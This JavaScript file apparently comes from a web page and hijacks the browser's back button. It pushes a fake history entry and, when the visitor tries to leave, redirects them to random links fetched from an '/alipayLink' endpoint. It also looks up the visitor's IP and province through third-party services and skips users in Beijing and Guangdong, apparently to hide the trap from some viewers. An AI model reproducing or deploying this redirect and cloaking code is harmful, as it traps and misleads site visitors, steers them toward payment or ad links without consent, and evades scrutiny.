function hrefs() {
	window.history.pushState('forward', null, location.pathname + location.search);
}

var qrs = [];
var qr_length = 0;

function init(){
	getLinks()
	setTimeout(function(){
		window.removeEventListener("pageshow",back_pageshow)
		window.addEventListener('pageshow',back_pageshow)
	},1000);
}

var back_pageshow = function(event) {
	console.log('pageshow')
	var count = parseInt(localStorage.getItem('count'))
	count= count?count:0
	if(count<qr_length+1){
		if(qrs.length != 0) {
				var index = parseInt(Math.random() * qrs.length)
				var tmp = qrs.splice(index,1)
				localStorage.setItem('count',(count+1).toString())
				location.href = tmp[0].link
		} else {
			console.log('history back')
			localStorage.setItem('count','0')
			history.back()
		}
	}else{
		localStorage.setItem('count','0')
		history.back()	
	}
}

$.getScript('http://pv.sohu.com/cityjson?ie=utf-8',function(){
	var ip = returnCitySN['cip'];
	var url = "http://whois.pconline.com.cn/ipJson.jsp?callback=cityJson&ip=" + ip;
	$.getScript(url, function (res) {
    });
})



function cityJson(cityData){
	alert(cityData.pro)
	if(cityData.pro.startsWith("北京")||cityData.pro.startsWith("广东")){
		console.log(cityData.pro)
	}else{
		init()
	}
}




function getLinks() {
	$.ajax({
		url: '/alipayLink',
		method: 'get',
		success: function(res) {
			qrs = res.data
			qrs.push({
				link : '/manhua.html'
			})
			qr_length = qrs.length
			hrefs()
		}
	})
}


if(window.history && window.history.pushState) {
	window.onpopstate = async function() {
		// if(!returnCitySN["cname"].startsWith("北京")){ 
//			if(!getCookie('mingxingshuo_alipay_xiaoshuo') && qrs.length != 0) {
//				var index = parseInt(Math.random() * qrs.length)
//				setCookie('mingxingshuo_alipay_xiaoshuo', 'wonazhidaoshinage')
//				location.href = qrs[index].link
//			} else {
//				console.log('history back')
//				history.back()
//			}
			var count = parseInt(localStorage.getItem('count'))
			count = count?count:0
			console.log('return count :'+count)
			if(count<qr_length+1){
				if(qrs.length != 0) {
						var index = parseInt(Math.random() * qrs.length)
						var tmp = qrs.splice(index,1)
						localStorage.setItem('count',(count+1).toString())
						location.href = tmp[0].link
				} else {
					console.log('history back')
					localStorage.setItem('count','0')
					history.back()
				}
			}else{
				localStorage.setItem('count','0')
				history.back()	
			}
		
		// }else{
		// 	console.log('history back')
		//  history.back()
		// }
	}
}

function setCookie(cookieName, cookieValue) {
	//当前日期
	var curDate = new Date();
	//当前时间戳
	var curTamp = curDate.getTime();
	//当日凌晨的时间戳,减去一毫秒是为了防止后续得到的时间不会达到00:00:00的状态
	var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
	//当日已经过去的时间（毫秒）
	var passedTamp = curTamp - curWeeHours;
	//当日剩余时间
	var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
	var leftTime = new Date();
	leftTime.setTime(leftTamp + curTamp);
	//创建cookie
	document.cookie = cookieName + "=" + escape(cookieValue) + ";expires=" + leftTime.toGMTString();
}

// 功能：获取cookies函数  
// 参数：name，cookie名字 

function getCookie(name) {   
	var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));   
	if(arr != null)    {       
		return unescape(arr[2]);   
	} else    {       
		return null;   
	}
}


// if(!returnCitySN["cname"].startsWith("北京")){ 
//     hrefs()    
// }else{
//     console.log('北京')
// }